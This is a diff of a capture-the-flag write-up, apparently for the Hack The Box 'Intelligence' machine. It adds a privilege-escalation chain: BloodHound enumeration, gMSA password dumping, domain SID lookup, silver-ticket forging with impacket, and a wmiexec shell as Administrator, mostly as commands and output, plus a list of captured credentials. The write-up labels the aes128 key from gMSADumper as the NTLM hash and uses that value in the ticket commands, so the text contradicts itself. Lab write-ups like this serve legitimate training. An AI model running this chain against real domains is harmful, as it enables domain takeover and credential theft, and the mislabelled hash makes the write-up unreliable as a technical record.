@@ -195,6 +195,8 @@ So let's try with an `exiftool` command over all the pdfs and extract a list of 
 ```bash
 exiftool *.pdf | grep Creator | tr -d " " | cut -d ":" -f2 > users
 ```
+### User Privilege Escalation
+
 Now that we have credentials we can execute a [Password Spraying](https://shuciran.github.io/posts/Password-Spraying/) [^password-spraying] attack on winrm service:
 ```bash
 crackmapexec winrm 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
@@ -342,19 +344,85 @@ After cracking the hash with [Hashcat](https://shuciran.github.io/posts/Hashcat/
 ```powershell
 Mr.Teddy
 ```
-
-### User Privilege Escalation
-After trying to access via `evil-winrm` unsuccessfully, now is time to think out of the box, the main idea is that if we have open ports tcp-53 and tcp-389 which corresponds to DNS and LDAP respectively, then we can execute [bloodhound.py](https://shuciran.github.io/posts/Bloodhound/)[^bloodhound-python]
-
 ### Root privesc
 
+After trying to access via `evil-winrm` unsuccessfully, now is time to think out of the box, the main idea is that if we have open ports tcp-53 and tcp-389 which corresponds to DNS and LDAP respectively, then we can execute [bloodhound.py](https://shuciran.github.io/posts/Bloodhound/)[^bloodhound-python] to extract useful information to escalate our privileges:
+```bash
+bloodhound.py -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
+```
+From Bloodhound we receive the following results:
+![Bloodhound-Results](/assets/img/Pasted image 20230601074941.png)
+
+After searching about how to execute a `ReadGMSAPassword` from our user, an excellent technique to obtain the GMSA password is abusing of [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) as follows:
+```bash
+/usr/share/privesc/Windows/gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::fca9edf1c9fb8f031dfc38d918279642
+svc_int$:aes256-cts-hmac-sha1-96:15516a903b67ce2aacda697b76fae9c2d1fc60e3408abc6587b2faeefb6bfac2
+svc_int$:aes128-cts-hmac-sha1-96:4e25dcda503a43e8757abe3081892114
+```
+Now that we have the NTLM hash, and after try to authenticate to the multiple services exposed on the machine (LDAP,SMB and WINRM) it's time to execute another attack such as Silver Ticket[^silver-ticket] by crafting it with `impacket-getST`, but first we need an SPN and de SID of the DC.
+To retrieve the SID we can abuse of `impacket-getPac` to extract it:
+```bash
+impacket-getPac intelligence.htb/Ted.Graves:Mr.Teddy -targetUser Administrator
+<SNIP>
+ResourceGroupCount:              1 
+ResourceGroupIds:               
+    [
+         
+        RelativeId:                      572 
+        Attributes:                      536870919 ,
+    ] 
+Domain SID: S-1-5-21-4210132550-3389855604-3437519686
+```
+And the SPN can be extracted from Bloodhound in the extra properties of the user `svc_int`:
+![SPN-Bloodhound](/assets/img/Pasted image 20230601093711.png)
+
+And finally we have this information to abuse `impacket-ticketer`:
+```bash
+SPN: WWW/dc.intelligence.htb
+SID: S-1-5-21-4210132550-3389855604-3437519686
+NTLM: 4e25dcda503a43e8757abe3081892114
+```
+Executing the following command, we can craft a silver ticket:
+```bash
+impacket-ticketer -spn WWW/dc.intelligence.htb -nthash 4e25dcda503a43e8757abe3081892114 -domain-sid S-1-5-21-4210132550-3389855604-3437519686 -dc-ip dc1.intelligence.htb Administrator -domain intelligence.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for intelligence.htb/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+Then we can execute the `impacket-wmiexec` to access the machine:
+```bash
+export KRB5CCNAME=Administrator.ccache
+impacket-wmiexec -k -no-pass dc.intelligence.htb
+C:\>whoami
+intelligence\administrator
+```
+AND WE ARE INSIDE!!!
 ### Post Exploitation
+It is also possible to craft a silver ticket[^silver-ticket-impacket-getst] with `impacket-getST` as follows:
+```bash
+impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4e25dcda503a43e8757abe3081892114
+```
 
 ### Credentials
-
 ```bash
 Tiffany.Molina:NewIntelligenceCorpUser9876
 Ted.Graves:Mr.Teddy
+svc_int:4e25dcda503a43e8757abe3081892114 <- NTLM Hash
 ```
 
 ### Notes
@@ -368,4 +436,6 @@ Ted.Graves:Mr.Teddy
 [^password-spraying]: Password Spraying
 [^ldap-record-addition]: LDAP Record Addition with dnstool.py
 [^responder]: LLMNR Attack poisoning the network and steal hashes
-[^bloodhound-python] Bloodhound Python to execute outside of the machine with credentials.
+[^bloodhound-python]: Bloodhound Python to execute outside of the machine with credentials
+[^silver-ticket]: Silver Ticket Attack
+[^silver-ticket-impacket-getst]: Impacket-getST can be abused as well to craft a silver ticket
